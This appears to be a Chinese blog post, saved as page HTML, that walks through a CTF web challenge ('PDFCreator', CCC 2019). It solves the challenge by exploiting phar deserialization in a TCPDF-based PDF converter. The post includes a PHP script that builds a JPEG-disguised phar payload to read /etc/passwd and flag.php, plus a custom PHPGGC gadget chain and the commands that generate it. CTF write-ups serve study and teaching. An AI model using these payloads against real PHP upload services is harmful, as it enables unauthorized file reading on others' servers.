@@ -1,0 +1,600 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="最爱 Python，会一点开发，CTF 卑微的 Web 手。 主攻代码审计、程序分析。">
+  <meta name="author" content="slug01sh">
+  <meta name="keywords" content="网络空间安全,高效率工具,计算机基础,经验分享,CTF">
+  <title>PDFCreator题解 - 积淀｜小杰的个人博客</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"slug01sh.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":"G-WTRCMZDFLE","gtag":"G-WTRCMZDFLE","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>积淀｜小杰的个人博客</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/ctf/">
+                <i class="iconfont icon-user-fill"></i>
+                CTF
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://rmt.dogedoge.com/fetch/fluid/storage/bg/dojm2h.png?w=1920&q=100&fmt=webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="PDFCreator题解">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-31 23:42" pubdate>
+        2020年10月31日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      31
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PDFCreator题解</h1>
+            
+            <div class="markdown-body">
+              <p>该题为 phar 反序列化，上传文件要求为图片。感觉 phpggc 工具挺香的，决定分享一下。</p>
+<p>比赛地址：<a target="_blank" rel="noopener" href="https://ctftime.org/event/854/tasks/">Chaos Communication Camp 2019 </a><br>题解1:<a target="_blank" rel="noopener" href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/">[Web] Chaos Communication Camp 2019 CTF - pdfcreator</a><br>题解2:<a target="_blank" rel="noopener" href="https://medium.com/@craig.knott92/ccc-2019-ctf-pdfcreator-9c76fd60452d">CCC 2019 CTF — PDFCreator</a></p>
+<hr>
+<a id="more"></a>
+
+<p>（ps：为啥突然做这题？某个大佬丢给我的，顺手就蹭了个环境，毕竟搭建环境挺麻烦的，补题都来不及</p>
+<p>首先体验一下网站，上传需要图片小于 500KB，从网上找了一张图片 5k。上传后返回结果。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 顶部显示：Upload successful: upload/fd456406745d816a45cae554c788e754.jpg</span><br><br>&lt;h1&gt;Converted by CoolPDF&lt;/h1&gt;&lt;h3&gt;We hope you enjoyed our service!&lt;/h3&gt;<br>     &lt;img src=<span class="hljs-string">&quot;upload/fd456406745d816a45cae554c788e754.jpg&quot;</span>&gt;<br>      <br></code></pre></td></tr></table></figure>
+
+<p>然后再次提交，返回结果为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># TCPDF ERROR: Unable to create output file: /var/www/html/output/81f851fd84a2591f4608f9a7715095ad.pdf</span><br></code></pre></td></tr></table></figure>
+
+<p>起初对 phar 不太熟悉，只有大致的了解。开始测试使用题解 1 的 payload，并未修改任何东西，payload 打上去没有任何结果。(实际上应该是有结果的，在 html 源码里，不会直接呈现在页面)<br>界面<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201031235650.png" srcset="/img/loading.gif"><br>源码<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201031235615.png" srcset="/img/loading.gif"></p>
+<p>知道真相，(-.-)# 直接气哭。以后记得多看源码！多看源码！多看源码！</p>
+<hr>
+<h1 id="方法1-手写phar"><a href="#方法1-手写phar" class="headerlink" title="方法1:手写phar"></a>方法1:手写phar</h1><p>首先创建 phar.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;creator.php&quot;</span>;<br>$jpeg_header_size =<br><span class="hljs-string">&quot;\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13&quot;</span>.<br><span class="hljs-string">&quot;\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02&quot;</span>.<br><span class="hljs-string">&quot;\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15&quot;</span>.<br><span class="hljs-string">&quot;\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&quot;</span>.<br><span class="hljs-string">&quot;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01&quot;</span>.<br><span class="hljs-string">&quot;\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03&quot;</span>.<br><span class="hljs-string">&quot;\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11&quot;</span>.<br><span class="hljs-string">&quot;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20&quot;</span>.<br><span class="hljs-string">&quot;\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01&quot;</span>.<br><span class="hljs-string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00&quot;</span>.<br><span class="hljs-string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda&quot;</span>.<br><span class="hljs-string">&quot;\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9&quot;</span>;<br>$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>$phar-&gt;startBuffering();<br>$phar-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br>$phar-&gt;setStub($jpeg_header_size.<span class="hljs-string">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>);<br>$o = <span class="hljs-keyword">new</span> \PDFStuff\PDFCreator();<br>$o-&gt;tmpfile = <span class="hljs-string">&quot;/etc/passwd&quot;</span>;<br>$phar-&gt;setMetadata($o);<br>$phar-&gt;stopBuffering();<br></code></pre></td></tr></table></figure>
+
+<p>然后执行命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">php phar.php<br>mv phar.phar phar.jpeg<br></code></pre></td></tr></table></figure>
+
+<p>将文件上传，并添加 phar 包装器，类似下面的格式</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Converted by CoolPDF<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>We hope you enjoyed our service!<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;phar://upload/708697c63f7eb369319c6523380bdf7a_11.jpg&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>最后可以得到结果（使用 /etc/passwd 容易回显，以后本地文件包含的时候尽量用这个文件吧）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/03C73EAE-9B6D-4097-86BF-675DAD58D598.png" srcset="/img/loading.gif"></p>
+<p>接着开始读/etc/apache2/sites-enabled/000-default.conf（修改上方高亮出），可以从这个文件中判断文件路径。在执行第一行命令的时候可能会报错(一堆输出)，可以不用理会。最终得到web的根路径为 /var/www/html。设置$o-&gt;tmpfile = “ /var/www/html/flag.php”，使用 F12 查看源码即可得到 flag。</p>
+<blockquote>
+<p>$flag = “flag{7f5c676fb4a062752124bcaf69a01701}”;</p>
+</blockquote>
+<hr>
+<h1 id="方法2-使用-PHPGGC-来实现-LFI（Local-File-Include）"><a href="#方法2-使用-PHPGGC-来实现-LFI（Local-File-Include）" class="headerlink" title="方法2: 使用 PHPGGC 来实现 LFI（Local File Include）"></a>方法2: 使用 PHPGGC 来实现 LFI（Local File Include）</h1><p>下载并且初始化 phpggc（复制模版）。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ambionics/</span>phpggc<br>$ cd phpggc<br>$ mkdir gadgetchains<span class="hljs-regexp">/Alles/</span> &amp;&amp; mkdir gadgetchains<span class="hljs-regexp">/Alles/</span>FR &amp;&amp; mkdir gadgetchains<span class="hljs-regexp">/Alles/</span>FR/<span class="hljs-number">1</span> <br>$ cp templates<span class="hljs-regexp">/* gadgetchains/</span>Alles<span class="hljs-regexp">/FR/</span><span class="hljs-number">1</span>/*<br></code></pre></td></tr></table></figure>
+
+<p>修改 gadgetchains/Alles/FR/1/ 下的 chain.php。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PDFStuff</span> &#123;<br>  <span class="hljs-title">class</span> <span class="hljs-title">PDFCreator</span> &#123; <span class="hljs-title">public</span> $<span class="hljs-title">tmpfile</span>; &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\<span class="hljs-title">Alles</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">FR1</span> <span class="hljs-title">extends</span> \<span class="hljs-title">PHPGGC</span>\<span class="hljs-title">GadgetChain</span>\<span class="hljs-title">FileRead</span> &#123;<br>        public static $version = &#x27;1.00&#x27;;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $vector = <span class="hljs-string">&#x27;__destruct&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $author = <span class="hljs-string">&#x27;teamrocketist&#x27;</span>;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $parameters</span>) </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> \PDFStuff\PDFCreator();<br>            $a-&gt;tmpfile = $parameters[<span class="hljs-string">&quot;remote_file&quot;</span>]; <span class="hljs-comment">// file to read</span><br>            <span class="hljs-keyword">return</span> $a;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>生成 phar 的图片，使用 /etc/passwd 更容易回显结果（有的 php 源码在浏览器中需要查看源码才能看到，比如 flag.php）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./phpggc Alles/FR1 /etc/passwd -f -pj ../dummy.jpg -o ../exploit.jpg<br><br></code></pre></td></tr></table></figure>
+
+<p>然后和上面的步骤一样，上传就可以读取文件。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/254F244D-5867-46BA-9C85-A952E884343C.png" srcset="/img/loading.gif"></p>
+<hr>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>在题解中，发现一个非常强大的工具——PHPGGC</p>
+<p>PHPGGC 是一款能够自动生成主流框架的序列化测试 payload 的工具,可以说是反序列化的武器库,平时遇到有关反序列化的题目时如果能够熟练运用它，将节省大量功夫。</p>
+<p>可以创建自己的模块，使用命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/ambionics/phpggc</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> phpggc</span><br><span class="hljs-meta">$</span><span class="bash"> mkdir gadgetchains/Alles/ &amp;&amp; mkdir gadgetchains/Alles/FR &amp;&amp; mkdir gadgetchains/Alles/FR/1</span><br><span class="hljs-meta">$</span><span class="bash"> cp templates/* gadgetchains/Alles/FR/1/*</span><br></code></pre></td></tr></table></figure>
+
+<p>默认的模版 chain.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\&#123;<span class="hljs-title">NAME</span>&#125;;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;CLASS_NAME&#125; <span class="hljs-keyword">extends</span> \&#123;BASE_CLASS_NAME&#125;<br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $version = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $vector = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $author = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $parameters</span>)</span><br><span class="hljs-function">    </span>&#123;<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>参考文章中的模块 chain.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PDFStuff</span> &#123;<br>  <span class="hljs-title">class</span> <span class="hljs-title">PDFCreator</span> &#123; <span class="hljs-title">public</span> $<span class="hljs-title">tmpfile</span>; &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\<span class="hljs-title">Alles</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">FR1</span> <span class="hljs-title">extends</span> \<span class="hljs-title">PHPGGC</span>\<span class="hljs-title">GadgetChain</span>\<span class="hljs-title">FileRead</span> &#123;<br>        public static $version = &#x27;1.00&#x27;;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $vector = <span class="hljs-string">&#x27;__destruct&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $author = <span class="hljs-string">&#x27;teamrocketist&#x27;</span>;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $parameters</span>) </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> \PDFStuff\PDFCreator();<br>            $a-&gt;tmpfile = $parameters[<span class="hljs-string">&quot;remote_file&quot;</span>]; <span class="hljs-comment">// file to read</span><br>            <span class="hljs-keyword">return</span> $a;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>其中 version、vector、author 在查看当前模块信息的时候会显示，如下图所示。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1B804691-FA75-4CAF-9B5C-4305E7974FF1.png" srcset="/img/loading.gif"></p>
+<p>构建phar的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./phpggc Alles/FR1 flag.php -f -pj ../dummy.jpg -o ../exploit.jpg<br></code></pre></td></tr></table></figure>
+<p>参数「-f」使用 fast-destruct 的方法，确保对象在反序列化的时候，能被摧毁。参数「-pj」创建 jpeg 格式的 phar，dummy.jpg 是一张普通图片。参数「-o」明确说明 payload 的输出地址。flag.php 是模块需要的参数，需要读取的远程文件的地址</p>
+<hr>
+<h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><p>在搜索到 TCPDF 的 cve，漏洞是由于 phar 类型的 php 反序列化导致的。故寻找 TCPDF 的利用点。这个地方需要使用到大型代码审计的技巧，通常可以按照如下所示的几个步骤来进行审计。</p>
+<ol>
+<li>找到危险函数；此处的危险函数一定在 反序列化所使用到的类，一定在类里的魔术方法里。</li>
+<li>向上回溯寻找有无可用输入点；寻找可控输入点。</li>
+<li>尝试绕过针对输入点的过滤；</li>
+<li>寻找触发漏洞的方法。</li>
+</ol>
+<p>而这个地方我们已经找到了漏洞，就需要先理清代码的基本逻辑思路。（关键点肯定在「类」中，毕竟这个题的考点是反序列化），可以考虑直接审计反序列化代码，再回溯利用点。</p>
+<p>先在 creator.php 中找到魔术方法，并寻找危险函数（由于 this-&gt;tmpfile 在反序列时可控），故需要进行反序列化然后本地文件包含，tmpfile 设置为我们需要的函数。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/A5780B58-D39F-4E52-809F-EA15216A4BB0.png" srcset="/img/loading.gif"></p>
+<p>编写生成 phar 代码</p>
+<ul>
+<li>方法1: phpggc 工具<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D31F2612-132F-48E3-BBA0-8B99AA623F93.png" srcset="/img/loading.gif"></li>
+<li>方法2:手动编写<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1E138875-D810-430B-ABD0-9F4594E2C11D.png" srcset="/img/loading.gif"></li>
+</ul>
+<p>最后需要使用包装器执行代码，如下图所示：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201101001720.png" srcset="/img/loading.gif"></p>
+<p>参考教程：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6699#toc-2">php反序列化拓展攻击详解–phar</a></li>
+<li><a target="_blank" rel="noopener" href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/">Chaos Communication Camp 2019 CTF - pdfcreator</a></li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a>
+                    
+                      <a class="hover-with-bg" href="/tags/phar/">phar</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020%E5%B9%B412%E6%9C%8821%E6%97%A5-%E8%A7%A3%E5%86%B3mac%E4%B8%ADpip3%E5%AF%B9%E5%BA%94python2/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">解决mac中pip3对应python2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020%E5%B9%B410%E6%9C%8825%E6%97%A5-ByteCTF%E9%A2%98%E8%A7%A3/">
+                        <span class="hidden-mobile">2020年10月ByteCTF部分web题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
